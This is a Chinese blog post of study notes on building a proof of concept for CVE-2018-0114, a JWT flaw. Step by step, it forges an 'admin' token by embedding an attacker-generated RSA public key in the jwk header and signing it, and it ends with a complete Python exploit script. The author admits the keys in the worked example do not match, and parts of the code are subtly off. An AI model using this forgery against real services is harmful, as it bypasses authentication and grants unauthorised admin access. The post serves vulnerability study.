
<!DOCTYPE html>
<html>
  <head>
    
<meta charset="utf-8" >

<title>CVE-2018-0114 POC编写与实践 | 持剑</title>
<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>



  </head>
  <body>
    <div id="app" class="main">
      <div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://1dayluo.github.io">
        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
      </a>
      <a href="https://1dayluo.github.io">
        <h1 class="site-title">持剑</h1>
      </a>
    </div>
    <div class="right">
      <transition name="fade">
        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
      </transition>
    </div>
  </div>
</div>

<transition name="fade">
  <div class="menu-container" style="display: none;" v-show="menuVisible">
    <div class="menu-list">
      
        
          <a href="/" class="menu purple-link">
            首页
          </a>
        
      
        
          <a href="/archives" class="menu purple-link">
            归档
          </a>
        
      
        
          <a href="/tags" class="menu purple-link">
            标签
          </a>
        
      
        
          <a href="/post/about" class="menu purple-link">
            关于
          </a>
        
      
    </div>
  </div>
</transition>


      <div class="content-container">
        <div class="post-detail">
          
          <h2 class="post-title">CVE-2018-0114 POC编写与实践</h2>
          <div class="post-info post-detail-info">
            <span><i class="icon-calendar-outline"></i> 2022-11-28</span>
            
              <span>
                <i class="icon-pricetags-outline"></i>
                
                  <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
                    学习笔记
                    
                      ，
                    
                  </a>
                
                  <a href="https://1dayluo.github.io/tag/0FS_pNNfC1/">
                    CVE
                    
                      ，
                    
                  </a>
                
                  <a href="https://1dayluo.github.io/tag/JEL_5lykWOR/">
                    jwt
                    
                  </a>
                
              </span>
            
          </div>
          <div class="post-content" v-pre>
            <p>一篇水文。。。起名困难症（改了几次） 参考思路就行</p>
<h2 id="poc构造思路">POC构造思路</h2>
<ol>
<li>先生成rsa密钥 ：public key 和private key</li>
</ol>
<pre><code class="language-python">import rsa 

def generate_key(key_size):
    print('[+]Creating-RSA-pair-key')
    (public_key, private_key) = rsa.newkeys(key_size, poolsize=8)
    print(&quot;\t[+]Pair-Key-created&quot;)

    return private_key, public_key

private_key, public_key = generate_key(int(512))
</code></pre>
<ol start="2">
<li>提取 n，e:</li>
</ol>
<pre><code class="language-python">print(public_key.n)
</code></pre>
<p>为：</p>
<pre><code class="language-python">7076715501507999070466602684619345782186000392746800466731867297328334333379571428801893507491054811882528149952022901781164450081630600727750713002635091
</code></pre>
<p>bytes转int（<a href="https://blog.csdn.net/iblade/article/details/73289831">https://blog.csdn.net/iblade/article/details/73289831</a> )</p>
<pre><code class="language-python">def pack_bigint(i):
    b = bytearray()
    while i:
        b.append(i &amp; 0xFF)
        i &gt;&gt;= 8
    return b[::-1]
</code></pre>
<p>然后再转为base64编码的</p>
<pre><code class="language-python">n=base64.urlsafe_b64encode(pack_bigint(pubkey.n)).decode('utf-8').rstrip('=')
e=base64.urlsafe_b64encode(pack_bigint(pubkey.e)).decode('utf-8').rstrip('=')
</code></pre>
<p>汇总一下写py脚本就是</p>
<pre><code class="language-python">def get_n_and_e(target):
    b = bytearray()
    while target:
        b.append( target &amp; 0xFF)
        target &gt;&gt;= 8
    int_object = b[::-1]
    return base64.urlsafe_b64encode(int_object).decode('utf-8').rstrip('=')
</code></pre>
<p>获取到的n为：</p>
<pre><code class="language-python">mbS8ENZVgERqASWVZK892gvgZug3Cul46tR6lLZFcmM7_8ZA4vLuUWdwfrXsZtM6z_ORJmGz2mQQ10J5uhlgZw
</code></pre>
<p>获取到的e为</p>
<pre><code class="language-python">AQAB
</code></pre>
<ol start="3">
<li>构造header</li>
</ol>
<p>将刚刚生成的n和e放入符合格式要求的header下（有jwk）</p>
<pre><code class="language-python">{
  &quot;alg&quot;:&quot;RS256&quot;,
  &quot;jwk&quot;:  {
          &quot;kty&quot;:&quot;RSA&quot;,
          &quot;kid&quot;:&quot;bilbo.baggins@hobbiton.example&quot;,
          &quot;use&quot;:&quot;sig&quot;,
          &quot;n&quot;:&quot;mbS8ENZVgERqASWVZK892gvgZug3Cul46tR6lLZFcmM7_8ZA4vLuUWdwfrXsZtM6z_ORJmGz2mQQ10J5uhlgZw&quot;,
          &quot;e&quot;:&quot;AQAB&quot;
          }
}
</code></pre>
<p>base64后则是：</p>
<pre><code class="language-python">ewogICJhbGciOiJSUzI1NiIsCiAgImp3ayI6ICB7CiAgICAgICAgICAia3R5IjoiUlNBIiwKICAgICAgICAgICJraWQiOiJiaWxiby5iYWdnaW5zQGhvYmJpdG9uLmV4YW1wbGUiLAogICAgICAgICAgInVzZSI6InNpZyIsCiAgICAgICAgICAibiI6Im1iUzhFTlpWZ0VScUFTV1ZaSzg5Mmd2Z1p1ZzNDdWw0NnRSNmxMWkZjbU03XzhaQTR2THVVV2R3ZnJYc1p0TTZ6X09SSm1HejJtUVExMEo1dWhsZ1p3IiwKICAgICAgICAgICJlIjoiQVFBQiIKICAgICAgICAgIH0KfQ
</code></pre>
<ol start="4">
<li>生成payload</li>
</ol>
<pre><code class="language-python">def generate_payload():
    logined_in = b'admin'
    payload = base64.urlsafe_b64encode(logined_in).decode('utf-8').rstrip('=')
    return payload
</code></pre>
<p>生成后的</p>
<pre><code class="language-python">YWRtaW4
</code></pre>
<ol start="5">
<li>对header+payload部分进行sign</li>
</ol>
<pre><code class="language-python">firstpart = &quot;ewogICJhbGciOiJSUzI1NiIsCiAgImp3ayI6ICB7CiAgICAgICAgICAia3R5IjoiUlNBIiwKICAgICAgICAgICJraWQiOiJiaWxiby5iYWdnaW5zQGhvYmJpdG9uLmV4YW1wbGUiLAogICAgICAgICAgInVzZSI6InNpZyIsCiAgICAgICAgICAibiI6Im1iUzhFTlpWZ0VScUFTV1ZaSzg5Mmd2Z1p1ZzNDdWw0NnRSNmxMWkZjbU03XzhaQTR2THVVV2R3ZnJYc1p0TTZ6X09SSm1HejJtUVExMEo1dWhsZ1p3IiwKICAgICAgICAgICJlIjoiQVFBQiIKICAgICAgICAgIH0KfQ.YWRtaW4&quot;
signature = rsa.sign(firstpart, private_key, 'SHA-256')
signature = base64.b64encode(signature)
</code></pre>
<p>最后为：</p>
<pre><code class="language-python">KlmabUs5RmdVCLWbjdWppgjy43kp9yxibCO8IHCXPV/oHGVziCIHS7XCdvATomjocdBM1ZnXU/nlJFWaK4Cuuw==
</code></pre>
<ol start="6">
<li>组合</li>
</ol>
<pre><code class="language-python">ewogICJhbGciOiJSUzI1NiIsCiAgImp3ayI6ICB7CiAgICAgICAgICAia3R5IjoiUlNBIiwKICAgICAgICAgICJraWQiOiJiaWxiby5iYWdnaW5zQGhvYmJpdG9uLmV4YW1wbGUiLAogICAgICAgICAgInVzZSI6InNpZyIsCiAgICAgICAgICAibiI6Im1iUzhFTlpWZ0VScUFTV1ZaSzg5Mmd2Z1p1ZzNDdWw0NnRSNmxMWkZjbU03XzhaQTR2THVVV2R3ZnJYc1p0TTZ6X09SSm1HejJtUVExMEo1dWhsZ1p3IiwKICAgICAgICAgICJlIjoiQVFBQiIKICAgICAgICAgIH0KfQ.YWRtaW4.KlmabUs5RmdVCLWbjdWppgjy43kp9yxibCO8IHCXPV/oHGVziCIHS7XCdvATomjocdBM1ZnXU/nlJFWaK4Cuuw
</code></pre>
<p>上面的仅供参考参考，模块化执行的（写好笔记后发现举的例子里private_key和public_key不是一对）</p>
<h2 id="汇总">汇总</h2>
<p>参考github（<a href="https://github.com/zi0Black/POC-CVE-2018-0114/blob/master/jwk-node-jose.py">POC-CVE-2018-0114/jwk-node-jose.py at master · zi0Black/POC-CVE-2018-0114 · GitHub</a>） ，我写的代码：</p>
<pre><code class="language-python">import rsa 
import base64
from urllib.parse import quote_plus
import json 

def generate_key(key_size):
    print('[+]Creating-RSA-pair-key')
    (public_key, private_key) = rsa.newkeys(key_size, poolsize=8)
    print(&quot;\t[+]Pair-Key-created&quot;)

    return private_key, public_key

def get_n_and_e(target):
    b = bytearray()
    while target:
        b.append( target &amp; 0xFF)
        target &gt;&gt;= 8
    int_object = b[::-1]
    return base64.urlsafe_b64encode(int_object).decode('utf-8').rstrip('=')

def generate_payload():
    logined_in = b'admin'
    payload = base64.urlsafe_b64encode(logined_in).decode('utf-8').rstrip('=')
    return payload
    print(payload)

def generate_header(public_key):
    n = get_n_and_e(public_key.n)
    e = get_n_and_e(public_key.e)

    format_header = {
      &quot;alg&quot;:&quot;RS256&quot;,
      &quot;jwk&quot;:  {
              &quot;kty&quot;:&quot;RSA&quot;,
              &quot;kid&quot;:&quot;bilbo.baggins@hobbiton.example&quot;,
              &quot;use&quot;:&quot;sig&quot;,
              &quot;n&quot;:f&quot;{n}&quot;,
              &quot;e&quot;:f&quot;{e}&quot;
              }
    }
    format_header = json.dumps(format_header)
    header = base64.b64encode(format_header.encode())
    return header

def sign(target,private_key):
    signature = rsa.sign(target, private_key, 'SHA-256')
    signature = base64.b64encode(signature)
    return signature


def output(header,payload,signature):
    auth = header+b'.'+payload+b'.'+signature
    auth = auth.decode('utf-8').rstrip('=') 
    return quote_plus(auth)
def main():
    private_key, public_key = generate_key(int(512))
    header = generate_header(public_key)
    payload = base64.b64encode(b'admin')
    signature = sign(header+b'.'+payload, private_key)
    print(output(header, payload, signature) )
main()
</code></pre>

          </div>
        </div>

        
          <div class="next-post">
            <a class="purple-link" href="https://1dayluo.github.io/post/wo-de-gao-ji-ri-chang-po-zhen-kai-yuan-xi-tong-grapheneos-de-tui-jian/">
              <h3 class="post-title">
                下一篇：我的「搞机」日常（破真）  - 开源系统GrapheneOS的推荐
              </h3>
            </a>
          </div>
          
      </div>

      

      <div class="site-footer">
  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
</div>


    </div>
    <script type="application/javascript">

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
